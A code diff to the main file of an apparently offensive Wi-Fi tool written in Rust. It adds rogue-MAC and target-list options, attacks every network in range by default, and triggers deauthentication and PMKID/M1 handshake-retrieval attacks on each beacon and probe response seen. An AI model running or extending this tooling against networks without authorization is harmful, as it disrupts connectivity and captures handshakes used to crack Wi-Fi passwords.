@@ -12,7 +12,7 @@ extern crate libc;
 extern crate nix;
 
 use anyhow::Result;
-use attack::{attack_authentication_from_ap, attack_beacon, attack_probe_response};
+use attack::{attack_authentication_from_ap, m1_retrieval_attack, deauth_attack};
 
 use crossterm::event::{poll, Event, KeyCode};
 use crossterm::terminal::{
@@ -47,6 +47,7 @@ use std::io;
 use std::io::stdout;
 use std::os::fd::{AsRawFd, OwnedFd};
 use std::process::exit;
+use std::str::FromStr;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 use std::thread;
@@ -66,6 +67,12 @@ struct Arguments {
     #[arg(short, long, default_values_t = [1, 6, 11]) ]
     /// Optional list of channels to scan.
     channels: Vec<u8>,
+    #[arg(short, long)]
+    /// Optional tx mac for rogue-based attacks - will randomize if excluded.
+    rogue: Option<String>,
+    #[arg(short, long)]
+    /// Optional list of targets to attack - will attack everything if excluded.
+    targets: Option<Vec<String>>,
     #[arg(long)]
     /// Optional do not transmit, passive only
     notx: bool,
@@ -100,7 +107,7 @@ impl UiState {
     }
 
     pub fn ap_sort_next(&mut self) -> u8 {
-        if self.ap_sort == 5 {
+        if self.ap_sort == 6 {
             self.ap_sort = 0;
             return self.ap_sort;
         }
@@ -180,6 +187,7 @@ pub struct OxideRuntime {
     tx_socket: OwnedFd,
     ui_state: UiState,
     notx: bool,
+    targets: Vec<MacAddress>,
     access_points: WiFiDeviceList<AccessPoint>,
     unassoc_clients: WiFiDeviceList<Station>,
     rogue_client: MacAddress,
@@ -193,7 +201,7 @@ pub struct OxideRuntime {
 }
 
 impl OxideRuntime {
-    pub fn new(interface_name: String, notx: bool) -> Self {
+    pub fn new(interface_name: String, notx: bool, rogue: Option<String>, targets: Option<Vec<String>>) -> Self {
         let access_points = WiFiDeviceList::new();
         let unassoc_clients = WiFiDeviceList::new();
         let handshake_storage = HandshakeStorage::new();
@@ -204,6 +212,12 @@ impl OxideRuntime {
                 println!("{}", get_art(&e));
                 exit(EXIT_FAILURE);
             }
+        };
+
+        let target_vec: Vec<MacAddress> = if let Some(vec_targets) = targets {
+            vec_targets.into_iter().map(|f| MacAddress::from_str(&f).unwrap()).collect()
+        } else {
+            vec!()
         };
 
         let idx = iface.index.unwrap();
@@ -219,13 +233,29 @@ impl OxideRuntime {
 
         println!("{}", iface.pretty_print());
 
+        if !target_vec.is_empty() {
+            let formatted: Vec<String> = target_vec.iter().map(|mac| mac.to_string()).collect();
+            let result = formatted.join(", ");
+            println!("Target List: {}", result);
+        } else {
+            println!("No target list provided... everything is a target 😏");
+        }
         thread::sleep(Duration::from_secs(1));
         println!("Setting {} down.", interface_name);
         set_interface_down(idx).ok();
-
         thread::sleep(Duration::from_millis(500));
-        let rogue_client = MacAddress::random();
-        println!("Randomizing {} mac to {}", interface_name, rogue_client);
+
+        let mut rogue_client = MacAddress::random();
+        if let Some(rogue) = rogue {
+            if let Ok(mac) = MacAddress::from_str(&rogue) {
+                println!("Setting {} mac to {} (from rogue)", interface_name, mac);
+                rogue_client = mac;
+            } else {
+                println!("Invalid rogue supplied - randomizing {} mac to {}", interface_name, rogue_client);
+            }
+        } else {
+            println!("Randomizing {} mac to {}", interface_name, rogue_client);
+        }
         set_interface_mac(idx, &rogue_client.0).ok();
 
         thread::sleep(Duration::from_millis(500));
@@ -261,6 +291,7 @@ impl OxideRuntime {
             tx_socket,
             ui_state: state,
             notx,
+            targets: target_vec,
             frame_count: 0,
             eapol_count: 0,
             error_count: 0,
@@ -306,7 +337,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                     .unwrap_or(AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?);
                 if bssid.is_real_device() {
                     let station_info = &beacon_frame.station_info;
-                    oxide.access_points.add_or_update_device(
+                    let ap = oxide.access_points.add_or_update_device(
                         bssid,
                         &AccessPoint::new(
                             bssid,
@@ -353,9 +384,11 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                             oxide.rogue_client,
                         ),
                     );
+                    ap.beacon_count += 1;
                 };
-
-                let _ = attack_beacon(oxide, &beacon_frame, &bssid);
+                let _ = m1_retrieval_attack(oxide, &bssid);
+                let _ = deauth_attack(oxide, &bssid);
+                
             }
             Frame::ProbeRequest(probe_request_frame) => {
                 let client_mac = probe_request_frame.header.address_2; // MAC address of the client
@@ -469,7 +502,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                             oxide.rogue_client,
                         ),
                     );
-                    let _ = attack_probe_response(oxide, &probe_response_frame, &bssid);
+                    let _ = m1_retrieval_attack(oxide, &bssid);
                 };
             }
             Frame::Authentication(auth_frame) => {
@@ -1169,11 +1202,17 @@ fn handle_data_frame(
 
     if let Some(eapol) = data_frame.eapol_key().clone() {
         oxide.eapol_count += 1;
-        let essid: Option<String> = if let Some(ap) = oxide.access_points.get_device(&ap_addr) {
-            ap.ssid.clone()
+        let ap = if let Some(ap) = oxide.access_points.get_device(&ap_addr) {
+            ap
         } else {
-            None
+            return Ok(());
         };
+
+        let essid = ap.ssid.clone();
+        
+        if station_addr == oxide.rogue_client && oxide.handshake_storage.has_m1_for_ap(&ap_addr){
+            return Ok(());
+        }
 
         let result = oxide.handshake_storage.add_or_update_handshake(
             &ap_addr,
@@ -1328,7 +1367,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let cli = Arguments::parse();
 
-    let mut oxide = OxideRuntime::new(cli.interface, cli.notx);
+    let mut oxide = OxideRuntime::new(cli.interface, cli.notx, cli.rogue, cli.targets);
     oxide.status_log.add_message(StatusMessage::new(
         MessageType::Info,
         "Starting...".to_string(),
